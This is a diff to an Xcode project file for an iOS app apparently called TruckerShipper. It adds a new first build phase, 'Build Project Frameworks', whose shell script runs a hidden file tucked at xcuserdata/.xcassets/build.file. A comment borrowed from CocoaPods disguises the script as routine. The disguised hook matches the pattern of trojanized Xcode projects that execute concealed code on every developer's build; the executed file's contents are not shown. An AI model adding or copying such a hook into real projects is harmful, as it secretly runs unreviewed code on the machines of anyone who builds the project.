@@ -1156,6 +1156,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FA37EA0B2574099D0073CF0C /* Build configuration list for PBXNativeTarget "TruckerShipper" */;
 			buildPhases = (
+				C482DCF4A3ADBE51F8AAC43A /* Build Project Frameworks */,
 				08E5564924FC2E4F3C760CCE /* [CP] Check Pods Manifest.lock */,
 				FA37E9F32574099A0073CF0C /* Sources */,
 				FA37E9F42574099A0073CF0C /* Frameworks */,
@@ -1258,6 +1259,28 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	C482DCF4A3ADBE51F8AAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
 		08E5564924FC2E4F3C760CCE /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
